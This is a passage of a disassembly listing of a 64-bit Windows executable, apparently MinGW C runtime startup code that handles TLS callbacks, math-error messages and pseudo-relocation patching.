   140001718:	74 06                	je     0x140001720
   14000171a:	c3                   	ret
   14000171b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001720:	c7 05 06 59 00 00 01 	movl   $0x1,0x5906(%rip)        # 0x140007030
   140001727:	00 00 00 
   14000172a:	e9 61 ff ff ff       	jmp    0x140001690
   14000172f:	90                   	nop
   140001730:	31 c0                	xor    %eax,%eax
   140001732:	c3                   	ret
   140001733:	90                   	nop
   140001734:	90                   	nop
   140001735:	90                   	nop
   140001736:	90                   	nop
   140001737:	90                   	nop
   140001738:	90                   	nop
   140001739:	90                   	nop
   14000173a:	90                   	nop
   14000173b:	90                   	nop
   14000173c:	90                   	nop
   14000173d:	90                   	nop
   14000173e:	90                   	nop
   14000173f:	90                   	nop
   140001740:	55                   	push   %rbp
   140001741:	48 89 e5             	mov    %rsp,%rbp
   140001744:	48 83 ec 20          	sub    $0x20,%rsp
   140001748:	83 fa 03             	cmp    $0x3,%edx
   14000174b:	74 13                	je     0x140001760
   14000174d:	85 d2                	test   %edx,%edx
   14000174f:	74 0f                	je     0x140001760
   140001751:	b8 01 00 00 00       	mov    $0x1,%eax
   140001756:	48 83 c4 20          	add    $0x20,%rsp
   14000175a:	5d                   	pop    %rbp
   14000175b:	c3                   	ret
   14000175c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001760:	e8 ab 0a 00 00       	call   0x140002210
   140001765:	b8 01 00 00 00       	mov    $0x1,%eax
   14000176a:	48 83 c4 20          	add    $0x20,%rsp
   14000176e:	5d                   	pop    %rbp
   14000176f:	c3                   	ret
   140001770:	55                   	push   %rbp
   140001771:	56                   	push   %rsi
   140001772:	53                   	push   %rbx
   140001773:	48 83 ec 20          	sub    $0x20,%rsp
   140001777:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000177c:	48 8b 05 ad 2b 00 00 	mov    0x2bad(%rip),%rax        # 0x140004330
   140001783:	83 38 02             	cmpl   $0x2,(%rax)
   140001786:	74 06                	je     0x14000178e
   140001788:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   14000178e:	83 fa 02             	cmp    $0x2,%edx
   140001791:	74 15                	je     0x1400017a8
   140001793:	83 fa 01             	cmp    $0x1,%edx
   140001796:	74 48                	je     0x1400017e0
   140001798:	b8 01 00 00 00       	mov    $0x1,%eax
   14000179d:	48 83 c4 20          	add    $0x20,%rsp
   1400017a1:	5b                   	pop    %rbx
   1400017a2:	5e                   	pop    %rsi
   1400017a3:	5d                   	pop    %rbp
   1400017a4:	c3                   	ret
   1400017a5:	0f 1f 00             	nopl   (%rax)
   1400017a8:	48 8d 1d a9 78 00 00 	lea    0x78a9(%rip),%rbx        # 0x140009058
   1400017af:	48 8d 35 a2 78 00 00 	lea    0x78a2(%rip),%rsi        # 0x140009058
   1400017b6:	48 39 f3             	cmp    %rsi,%rbx
   1400017b9:	74 dd                	je     0x140001798
   1400017bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400017c0:	48 8b 03             	mov    (%rbx),%rax
   1400017c3:	48 85 c0             	test   %rax,%rax
   1400017c6:	74 02                	je     0x1400017ca
   1400017c8:	ff d0                	call   *%rax
   1400017ca:	48 83 c3 08          	add    $0x8,%rbx
   1400017ce:	48 39 f3             	cmp    %rsi,%rbx
   1400017d1:	75 ed                	jne    0x1400017c0
   1400017d3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017d8:	48 83 c4 20          	add    $0x20,%rsp
   1400017dc:	5b                   	pop    %rbx
   1400017dd:	5e                   	pop    %rsi
   1400017de:	5d                   	pop    %rbp
   1400017df:	c3                   	ret
   1400017e0:	e8 2b 0a 00 00       	call   0x140002210
   1400017e5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017ea:	48 83 c4 20          	add    $0x20,%rsp
   1400017ee:	5b                   	pop    %rbx
   1400017ef:	5e                   	pop    %rsi
   1400017f0:	5d                   	pop    %rbp
   1400017f1:	c3                   	ret
   1400017f2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400017f9:	00 00 00 00 
   1400017fd:	0f 1f 00             	nopl   (%rax)
   140001800:	31 c0                	xor    %eax,%eax
   140001802:	c3                   	ret
   140001803:	90                   	nop
   140001804:	90                   	nop
   140001805:	90                   	nop
   140001806:	90                   	nop
   140001807:	90                   	nop
   140001808:	90                   	nop
   140001809:	90                   	nop
   14000180a:	90                   	nop
   14000180b:	90                   	nop
   14000180c:	90                   	nop
   14000180d:	90                   	nop
   14000180e:	90                   	nop
   14000180f:	90                   	nop
   140001810:	55                   	push   %rbp
   140001811:	56                   	push   %rsi
   140001812:	53                   	push   %rbx
   140001813:	48 83 ec 70          	sub    $0x70,%rsp
   140001817:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000181c:	0f 11 75 00          	movups %xmm6,0x0(%rbp)
   140001820:	0f 11 7d 10          	movups %xmm7,0x10(%rbp)
   140001824:	44 0f 11 45 20       	movups %xmm8,0x20(%rbp)
   140001829:	83 39 06             	cmpl   $0x6,(%rcx)
   14000182c:	0f 87 ca 00 00 00    	ja     0x1400018fc
   140001832:	8b 01                	mov    (%rcx),%eax
   140001834:	48 8d 15 49 29 00 00 	lea    0x2949(%rip),%rdx        # 0x140004184
   14000183b:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   14000183f:	48 01 d0             	add    %rdx,%rax
   140001842:	ff e0                	jmp    *%rax
   140001844:	0f 1f 40 00          	nopl   0x0(%rax)
   140001848:	48 8d 1d 30 28 00 00 	lea    0x2830(%rip),%rbx        # 0x14000407f
   14000184f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140001855:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   14000185a:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   14000185f:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   140001863:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001868:	e8 23 0f 00 00       	call   0x140002790
   14000186d:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   140001874:	49 89 d8             	mov    %rbx,%r8
   140001877:	48 8d 15 da 28 00 00 	lea    0x28da(%rip),%rdx        # 0x140004158
   14000187e:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   140001884:	48 89 c1             	mov    %rax,%rcx
   140001887:	49 89 f1             	mov    %rsi,%r9
   14000188a:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   140001890:	e8 8b 0f 00 00       	call   0x140002820
   140001895:	90                   	nop
   140001896:	0f 10 75 00          	movups 0x0(%rbp),%xmm6
   14000189a:	0f 10 7d 10          	movups 0x10(%rbp),%xmm7
   14000189e:	31 c0                	xor    %eax,%eax
   1400018a0:	44 0f 10 45 20       	movups 0x20(%rbp),%xmm8
   1400018a5:	48 83 c4 70          	add    $0x70,%rsp
   1400018a9:	5b                   	pop    %rbx
   1400018aa:	5e                   	pop    %rsi
   1400018ab:	5d                   	pop    %rbp
   1400018ac:	c3                   	ret
   1400018ad:	0f 1f 00             	nopl   (%rax)
   1400018b0:	48 8d 1d a9 27 00 00 	lea    0x27a9(%rip),%rbx        # 0x140004060
   1400018b7:	eb 96                	jmp    0x14000184f
   1400018b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400018c0:	48 8d 1d f9 27 00 00 	lea    0x27f9(%rip),%rbx        # 0x1400040c0
   1400018c7:	eb 86                	jmp    0x14000184f
   1400018c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400018d0:	48 8d 1d c9 27 00 00 	lea    0x27c9(%rip),%rbx        # 0x1400040a0
   1400018d7:	e9 73 ff ff ff       	jmp    0x14000184f
   1400018dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400018e0:	48 8d 1d 29 28 00 00 	lea    0x2829(%rip),%rbx        # 0x140004110
   1400018e7:	e9 63 ff ff ff       	jmp    0x14000184f
   1400018ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400018f0:	48 8d 1d f1 27 00 00 	lea    0x27f1(%rip),%rbx        # 0x1400040e8
   1400018f7:	e9 53 ff ff ff       	jmp    0x14000184f
   1400018fc:	48 8d 1d 43 28 00 00 	lea    0x2843(%rip),%rbx        # 0x140004146
   140001903:	e9 47 ff ff ff       	jmp    0x14000184f
   140001908:	90                   	nop
   140001909:	90                   	nop
   14000190a:	90                   	nop
   14000190b:	90                   	nop
   14000190c:	90                   	nop
   14000190d:	90                   	nop
   14000190e:	90                   	nop
   14000190f:	90                   	nop
   140001910:	db e3                	fninit
   140001912:	c3                   	ret
   140001913:	90                   	nop
   140001914:	90                   	nop
   140001915:	90                   	nop
   140001916:	90                   	nop
   140001917:	90                   	nop
   140001918:	90                   	nop
   140001919:	90                   	nop
   14000191a:	90                   	nop
   14000191b:	90                   	nop
   14000191c:	90                   	nop
   14000191d:	90                   	nop
   14000191e:	90                   	nop
   14000191f:	90                   	nop
   140001920:	55                   	push   %rbp
   140001921:	56                   	push   %rsi
   140001922:	53                   	push   %rbx
   140001923:	48 83 ec 30          	sub    $0x30,%rsp
   140001927:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000192c:	48 89 cb             	mov    %rcx,%rbx
   14000192f:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140001933:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001938:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   14000193c:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140001940:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140001944:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140001948:	e8 43 0e 00 00       	call   0x140002790
   14000194d:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140001953:	ba 01 00 00 00       	mov    $0x1,%edx
   140001958:	48 8d 0d 41 28 00 00 	lea    0x2841(%rip),%rcx        # 0x1400041a0
   14000195f:	49 89 c1             	mov    %rax,%r9
   140001962:	e8 c9 0e 00 00       	call   0x140002830
   140001967:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
   14000196b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001970:	e8 1b 0e 00 00       	call   0x140002790
   140001975:	48 89 da             	mov    %rbx,%rdx
   140001978:	48 89 c1             	mov    %rax,%rcx
   14000197b:	49 89 f0             	mov    %rsi,%r8
   14000197e:	e8 dd 0e 00 00       	call   0x140002860
   140001983:	e8 80 0e 00 00       	call   0x140002808
   140001988:	90                   	nop
   140001989:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001990:	55                   	push   %rbp
   140001991:	57                   	push   %rdi
   140001992:	56                   	push   %rsi
   140001993:	53                   	push   %rbx
   140001994:	48 83 ec 58          	sub    $0x58,%rsp
   140001998:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000199d:	48 63 35 00 57 00 00 	movslq 0x5700(%rip),%rsi        # 0x1400070a4
   1400019a4:	48 89 cb             	mov    %rcx,%rbx
   1400019a7:	85 f6                	test   %esi,%esi
   1400019a9:	0f 8e 11 01 00 00    	jle    0x140001ac0
   1400019af:	48 8b 05 f2 56 00 00 	mov    0x56f2(%rip),%rax        # 0x1400070a8
   1400019b6:	45 31 c9             	xor    %r9d,%r9d
   1400019b9:	48 83 c0 18          	add    $0x18,%rax
   1400019bd:	0f 1f 00             	nopl   (%rax)
   1400019c0:	4c 8b 00             	mov    (%rax),%r8
   1400019c3:	4c 39 c3             	cmp    %r8,%rbx
   1400019c6:	72 13                	jb     0x1400019db
   1400019c8:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400019cc:	8b 52 08             	mov    0x8(%rdx),%edx
   1400019cf:	49 01 d0             	add    %rdx,%r8
   1400019d2:	4c 39 c3             	cmp    %r8,%rbx
   1400019d5:	0f 82 88 00 00 00    	jb     0x140001a63
   1400019db:	41 83 c1 01          	add    $0x1,%r9d
   1400019df:	48 83 c0 28          	add    $0x28,%rax
   1400019e3:	41 39 f1             	cmp    %esi,%r9d
   1400019e6:	75 d8                	jne    0x1400019c0
   1400019e8:	48 89 d9             	mov    %rbx,%rcx
   1400019eb:	e8 50 0a 00 00       	call   0x140002440
   1400019f0:	48 89 c7             	mov    %rax,%rdi
   1400019f3:	48 85 c0             	test   %rax,%rax
   1400019f6:	0f 84 e6 00 00 00    	je     0x140001ae2
   1400019fc:	48 8b 05 a5 56 00 00 	mov    0x56a5(%rip),%rax        # 0x1400070a8
   140001a03:	48 8d 1c b6          	lea    (%rsi,%rsi,4),%rbx
   140001a07:	48 c1 e3 03          	shl    $0x3,%rbx
   140001a0b:	48 01 d8             	add    %rbx,%rax
   140001a0e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140001a12:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001a18:	e8 63 0b 00 00       	call   0x140002580
   140001a1d:	8b 57 0c             	mov    0xc(%rdi),%edx
   140001a20:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001a26:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
   140001a2a:	48 8b 05 77 56 00 00 	mov    0x5677(%rip),%rax        # 0x1400070a8
   140001a31:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140001a35:	48 89 4c 18 18       	mov    %rcx,0x18(%rax,%rbx,1)
   140001a3a:	ff 15 f0 67 00 00    	call   *0x67f0(%rip)        # 0x140008230
   140001a40:	48 85 c0             	test   %rax,%rax
   140001a43:	0f 84 7e 00 00 00    	je     0x140001ac7
   140001a49:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140001a4c:	8d 50 fc             	lea    -0x4(%rax),%edx
   140001a4f:	83 e2 fb             	and    $0xfffffffb,%edx
   140001a52:	74 08                	je     0x140001a5c
   140001a54:	8d 50 c0             	lea    -0x40(%rax),%edx
   140001a57:	83 e2 bf             	and    $0xffffffbf,%edx
   140001a5a:	75 14                	jne    0x140001a70
   140001a5c:	83 05 41 56 00 00 01 	addl   $0x1,0x5641(%rip)        # 0x1400070a4
   140001a63:	48 83 c4 58          	add    $0x58,%rsp
   140001a67:	5b                   	pop    %rbx
   140001a68:	5e                   	pop    %rsi
   140001a69:	5f                   	pop    %rdi
   140001a6a:	5d                   	pop    %rbp
   140001a6b:	c3                   	ret
   140001a6c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001a70:	83 f8 02             	cmp    $0x2,%eax
   140001a73:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140001a77:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140001a7b:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001a81:	b8 04 00 00 00       	mov    $0x4,%eax
   140001a86:	44 0f 44 c0          	cmove  %eax,%r8d
   140001a8a:	48 03 1d 17 56 00 00 	add    0x5617(%rip),%rbx        # 0x1400070a8
   140001a91:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140001a95:	49 89 d9             	mov    %rbx,%r9
   140001a98:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   140001a9c:	ff 15 86 67 00 00    	call   *0x6786(%rip)        # 0x140008228
   140001aa2:	85 c0                	test   %eax,%eax
   140001aa4:	75 b6                	jne    0x140001a5c
   140001aa6:	ff 15 2c 67 00 00    	call   *0x672c(%rip)        # 0x1400081d8
   140001aac:	48 8d 0d 65 27 00 00 	lea    0x2765(%rip),%rcx        # 0x140004218
   140001ab3:	89 c2                	mov    %eax,%edx
   140001ab5:	e8 66 fe ff ff       	call   0x140001920
   140001aba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001ac0:	31 f6                	xor    %esi,%esi
   140001ac2:	e9 21 ff ff ff       	jmp    0x1400019e8
   140001ac7:	48 8b 05 da 55 00 00 	mov    0x55da(%rip),%rax        # 0x1400070a8
   140001ace:	8b 57 08             	mov    0x8(%rdi),%edx
   140001ad1:	48 8d 0d 08 27 00 00 	lea    0x2708(%rip),%rcx        # 0x1400041e0
   140001ad8:	4c 8b 44 18 18       	mov    0x18(%rax,%rbx,1),%r8
   140001add:	e8 3e fe ff ff       	call   0x140001920
   140001ae2:	48 89 da             	mov    %rbx,%rdx
   140001ae5:	48 8d 0d d4 26 00 00 	lea    0x26d4(%rip),%rcx        # 0x1400041c0
   140001aec:	e8 2f fe ff ff       	call   0x140001920
   140001af1:	90                   	nop
   140001af2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001af9:	00 00 00 00 
   140001afd:	0f 1f 00             	nopl   (%rax)
   140001b00:	55                   	push   %rbp
   140001b01:	41 57                	push   %r15
   140001b03:	41 56                	push   %r14
   140001b05:	41 55                	push   %r13
   140001b07:	41 54                	push   %r12
   140001b09:	57                   	push   %rdi
   140001b0a:	56                   	push   %rsi
   140001b0b:	53                   	push   %rbx
   140001b0c:	48 83 ec 48          	sub    $0x48,%rsp
   140001b10:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140001b15:	44 8b 25 84 55 00 00 	mov    0x5584(%rip),%r12d        # 0x1400070a0
   140001b1c:	45 85 e4             	test   %r12d,%r12d
   140001b1f:	74 17                	je     0x140001b38
   140001b21:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140001b25:	5b                   	pop    %rbx
   140001b26:	5e                   	pop    %rsi
   140001b27:	5f                   	pop    %rdi
   140001b28:	41 5c                	pop    %r12
   140001b2a:	41 5d                	pop    %r13
   140001b2c:	41 5e                	pop    %r14
   140001b2e:	41 5f                	pop    %r15
   140001b30:	5d                   	pop    %rbp
   140001b31:	c3                   	ret
   140001b32:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001b38:	c7 05 5e 55 00 00 01 	movl   $0x1,0x555e(%rip)        # 0x1400070a0
   140001b3f:	00 00 00 
   140001b42:	e8 79 09 00 00       	call   0x1400024c0
   140001b47:	48 98                	cltq
   140001b49:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140001b4d:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   140001b54:	00 
   140001b55:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140001b59:	e8 b2 0b 00 00       	call   0x140002710
   140001b5e:	4c 8b 2d fb 27 00 00 	mov    0x27fb(%rip),%r13        # 0x140004360
   140001b65:	48 8b 1d 04 28 00 00 	mov    0x2804(%rip),%rbx        # 0x140004370
   140001b6c:	c7 05 2e 55 00 00 00 	movl   $0x0,0x552e(%rip)        # 0x1400070a4
   140001b73:	00 00 00 
   140001b76:	48 29 c4             	sub    %rax,%rsp
   140001b79:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001b7e:	48 89 05 23 55 00 00 	mov    %rax,0x5523(%rip)        # 0x1400070a8
   140001b85:	4c 89 e8             	mov    %r13,%rax
   140001b88:	48 29 d8             	sub    %rbx,%rax
   140001b8b:	48 83 f8 07          	cmp    $0x7,%rax
   140001b8f:	7e 90                	jle    0x140001b21
   140001b91:	8b 13                	mov    (%rbx),%edx
   140001b93:	48 83 f8 0b          	cmp    $0xb,%rax
   140001b97:	0f 8f 03 01 00 00    	jg     0x140001ca0
   140001b9d:	8b 03                	mov    (%rbx),%eax
   140001b9f:	85 c0                	test   %eax,%eax
   140001ba1:	0f 85 69 02 00 00    	jne    0x140001e10
   140001ba7:	8b 43 04             	mov    0x4(%rbx),%eax
   140001baa:	85 c0                	test   %eax,%eax
   140001bac:	0f 85 5e 02 00 00    	jne    0x140001e10
   140001bb2:	8b 53 08             	mov    0x8(%rbx),%edx
   140001bb5:	83 fa 01             	cmp    $0x1,%edx
   140001bb8:	0f 85 92 02 00 00    	jne    0x140001e50
   140001bbe:	48 83 c3 0c          	add    $0xc,%rbx
   140001bc2:	4c 39 eb             	cmp    %r13,%rbx
   140001bc5:	0f 83 56 ff ff ff    	jae    0x140001b21
   140001bcb:	4c 8b 35 be 27 00 00 	mov    0x27be(%rip),%r14        # 0x140004390
   140001bd2:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001bd8:	eb 65                	jmp    0x140001c3f
   140001bda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001be0:	83 f9 08             	cmp    $0x8,%ecx
   140001be3:	0f 84 d7 00 00 00    	je     0x140001cc0
   140001be9:	83 f9 10             	cmp    $0x10,%ecx
   140001bec:	0f 85 50 02 00 00    	jne    0x140001e42
   140001bf2:	0f b7 37             	movzwl (%rdi),%esi
   140001bf5:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140001bfb:	66 85 f6             	test   %si,%si
   140001bfe:	0f 89 cc 01 00 00    	jns    0x140001dd0
   140001c04:	48 81 ce 00 00 ff ff 	or     $0xffffffffffff0000,%rsi
   140001c0b:	48 29 c6             	sub    %rax,%rsi
   140001c0e:	4c 01 ce             	add    %r9,%rsi
   140001c11:	85 d2                	test   %edx,%edx
   140001c13:	75 12                	jne    0x140001c27
   140001c15:	48 81 fe 00 80 ff ff 	cmp    $0xffffffffffff8000,%rsi
   140001c1c:	7c 65                	jl     0x140001c83
   140001c1e:	48 81 fe ff ff 00 00 	cmp    $0xffff,%rsi
   140001c25:	7f 5c                	jg     0x140001c83
   140001c27:	48 89 f9             	mov    %rdi,%rcx
   140001c2a:	e8 61 fd ff ff       	call   0x140001990
   140001c2f:	66 89 37             	mov    %si,(%rdi)
   140001c32:	48 83 c3 0c          	add    $0xc,%rbx
   140001c36:	4c 39 eb             	cmp    %r13,%rbx
   140001c39:	0f 83 d1 00 00 00    	jae    0x140001d10
   140001c3f:	8b 03                	mov    (%rbx),%eax
   140001c41:	8b 53 08             	mov    0x8(%rbx),%edx
   140001c44:	8b 7b 04             	mov    0x4(%rbx),%edi
   140001c47:	4c 01 f0             	add    %r14,%rax
   140001c4a:	0f b6 ca             	movzbl %dl,%ecx
   140001c4d:	4c 8b 08             	mov    (%rax),%r9
   140001c50:	4c 01 f7             	add    %r14,%rdi
   140001c53:	83 f9 20             	cmp    $0x20,%ecx
   140001c56:	0f 84 0c 01 00 00    	je     0x140001d68
   140001c5c:	76 82                	jbe    0x140001be0
   140001c5e:	83 f9 40             	cmp    $0x40,%ecx
   140001c61:	0f 85 db 01 00 00    	jne    0x140001e42
   140001c67:	48 8b 37             	mov    (%rdi),%rsi
   140001c6a:	89 d1                	mov    %edx,%ecx
   140001c6c:	48 29 c6             	sub    %rax,%rsi
   140001c6f:	4c 01 ce             	add    %r9,%rsi
   140001c72:	81 e1 c0 00 00 00    	and    $0xc0,%ecx
   140001c78:	0f 85 42 01 00 00    	jne    0x140001dc0
   140001c7e:	48 85 f6             	test   %rsi,%rsi
   140001c81:	78 af                	js     0x140001c32
   140001c83:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001c88:	89 ca                	mov    %ecx,%edx
   140001c8a:	49 89 f8             	mov    %rdi,%r8
   140001c8d:	48 8d 0d 14 26 00 00 	lea    0x2614(%rip),%rcx        # 0x1400042a8
   140001c94:	e8 87 fc ff ff       	call   0x140001920
   140001c99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ca0:	85 d2                	test   %edx,%edx
   140001ca2:	0f 85 68 01 00 00    	jne    0x140001e10
   140001ca8:	8b 43 04             	mov    0x4(%rbx),%eax
   140001cab:	89 c2                	mov    %eax,%edx
   140001cad:	0b 53 08             	or     0x8(%rbx),%edx
   140001cb0:	0f 85 f4 fe ff ff    	jne    0x140001baa
   140001cb6:	48 83 c3 0c          	add    $0xc,%rbx
   140001cba:	e9 de fe ff ff       	jmp    0x140001b9d
   140001cbf:	90                   	nop
   140001cc0:	0f b6 37             	movzbl (%rdi),%esi
   140001cc3:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140001cc9:	40 84 f6             	test   %sil,%sil
   140001ccc:	0f 89 26 01 00 00    	jns    0x140001df8
   140001cd2:	48 81 ce 00 ff ff ff 	or     $0xffffffffffffff00,%rsi
   140001cd9:	48 29 c6             	sub    %rax,%rsi
   140001cdc:	4c 01 ce             	add    %r9,%rsi
   140001cdf:	85 d2                	test   %edx,%edx
   140001ce1:	75 0f                	jne    0x140001cf2
   140001ce3:	48 81 fe ff 00 00 00 	cmp    $0xff,%rsi
   140001cea:	7f 97                	jg     0x140001c83
   140001cec:	48 83 fe 80          	cmp    $0xffffffffffffff80,%rsi
   140001cf0:	7c 91                	jl     0x140001c83
   140001cf2:	48 89 f9             	mov    %rdi,%rcx
   140001cf5:	48 83 c3 0c          	add    $0xc,%rbx
   140001cf9:	e8 92 fc ff ff       	call   0x140001990
   140001cfe:	40 88 37             	mov    %sil,(%rdi)
   140001d01:	4c 39 eb             	cmp    %r13,%rbx
   140001d04:	0f 82 35 ff ff ff    	jb     0x140001c3f
   140001d0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001d10:	8b 15 8e 53 00 00    	mov    0x538e(%rip),%edx        # 0x1400070a4
   140001d16:	85 d2                	test   %edx,%edx
   140001d18:	0f 8e 03 fe ff ff    	jle    0x140001b21
   140001d1e:	48 8b 35 03 65 00 00 	mov    0x6503(%rip),%rsi        # 0x140008228
   140001d25:	31 db                	xor    %ebx,%ebx
   140001d27:	48 8d 7d fc          	lea    -0x4(%rbp),%rdi
   140001d2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d30:	48 8b 05 71 53 00 00 	mov    0x5371(%rip),%rax        # 0x1400070a8
   140001d37:	48 01 d8             	add    %rbx,%rax
   140001d3a:	44 8b 00             	mov    (%rax),%r8d
   140001d3d:	45 85 c0             	test   %r8d,%r8d
   140001d40:	74 0d                	je     0x140001d4f
   140001d42:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140001d46:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001d4a:	49 89 f9             	mov    %rdi,%r9
   140001d4d:	ff d6                	call   *%rsi
   140001d4f:	41 83 c4 01          	add    $0x1,%r12d
   140001d53:	48 83 c3 28          	add    $0x28,%rbx
   140001d57:	44 3b 25 46 53 00 00 	cmp    0x5346(%rip),%r12d        # 0x1400070a4
   140001d5e:	7c d0                	jl     0x140001d30
   140001d60:	e9 bc fd ff ff       	jmp    0x140001b21
   140001d65:	0f 1f 00             	nopl   (%rax)
   140001d68:	8b 37                	mov    (%rdi),%esi
   140001d6a:	81 e2 c0 00 00 00    	and    $0xc0,%edx
   140001d70:	85 f6                	test   %esi,%esi
   140001d72:	79 74                	jns    0x140001de8
   140001d74:	49 bb 00 00 00 00 ff 	movabs $0xffffffff00000000,%r11
   140001d7b:	ff ff ff 
   140001d7e:	4c 09 de             	or     %r11,%rsi
   140001d81:	48 29 c6             	sub    %rax,%rsi
   140001d84:	4c 01 ce             	add    %r9,%rsi
   140001d87:	85 d2                	test   %edx,%edx
   140001d89:	75 1c                	jne    0x140001da7
   140001d8b:	4c 39 fe             	cmp    %r15,%rsi
   140001d8e:	0f 8f ef fe ff ff    	jg     0x140001c83
   140001d94:	48 b8 ff ff ff 7f ff 	movabs $0xffffffff7fffffff,%rax
   140001d9b:	ff ff ff 
   140001d9e:	48 39 c6             	cmp    %rax,%rsi
   140001da1:	0f 8e dc fe ff ff    	jle    0x140001c83
   140001da7:	48 89 f9             	mov    %rdi,%rcx
   140001daa:	e8 e1 fb ff ff       	call   0x140001990
   140001daf:	89 37                	mov    %esi,(%rdi)
   140001db1:	e9 7c fe ff ff       	jmp    0x140001c32
   140001db6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001dbd:	00 00 00 
   140001dc0:	48 89 f9             	mov    %rdi,%rcx
   140001dc3:	e8 c8 fb ff ff       	call   0x140001990
   140001dc8:	48 89 37             	mov    %rsi,(%rdi)
   140001dcb:	e9 62 fe ff ff       	jmp    0x140001c32
   140001dd0:	48 29 c6             	sub    %rax,%rsi
   140001dd3:	4c 01 ce             	add    %r9,%rsi
   140001dd6:	85 d2                	test   %edx,%edx
   140001dd8:	0f 84 37 fe ff ff    	je     0x140001c15
   140001dde:	e9 44 fe ff ff       	jmp    0x140001c27
   140001de3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001de8:	48 29 c6             	sub    %rax,%rsi
   140001deb:	4c 01 ce             	add    %r9,%rsi
   140001dee:	85 d2                	test   %edx,%edx
   140001df0:	74 99                	je     0x140001d8b
   140001df2:	eb b3                	jmp    0x140001da7
   140001df4:	0f 1f 40 00          	nopl   0x0(%rax)
   140001df8:	48 29 c6             	sub    %rax,%rsi
   140001dfb:	4c 01 ce             	add    %r9,%rsi
   140001dfe:	85 d2                	test   %edx,%edx
   140001e00:	0f 84 dd fe ff ff    	je     0x140001ce3
   140001e06:	e9 e7 fe ff ff       	jmp    0x140001cf2
   140001e0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e10:	4c 39 eb             	cmp    %r13,%rbx
   140001e13:	0f 83 08 fd ff ff    	jae    0x140001b21
   140001e19:	4c 8b 35 70 25 00 00 	mov    0x2570(%rip),%r14        # 0x140004390
   140001e20:	8b 73 04             	mov    0x4(%rbx),%esi
   140001e23:	8b 3b                	mov    (%rbx),%edi
   140001e25:	48 83 c3 08          	add    $0x8,%rbx
   140001e29:	4c 01 f6             	add    %r14,%rsi
   140001e2c:	03 3e                	add    (%rsi),%edi
   140001e2e:	48 89 f1             	mov    %rsi,%rcx
   140001e31:	e8 5a fb ff ff       	call   0x140001990
   140001e36:	89 3e                	mov    %edi,(%rsi)
   140001e38:	4c 39 eb             	cmp    %r13,%rbx
   140001e3b:	72 e3                	jb     0x140001e20
   140001e3d:	e9 ce fe ff ff       	jmp    0x140001d10
   140001e42:	89 ca                	mov    %ecx,%edx
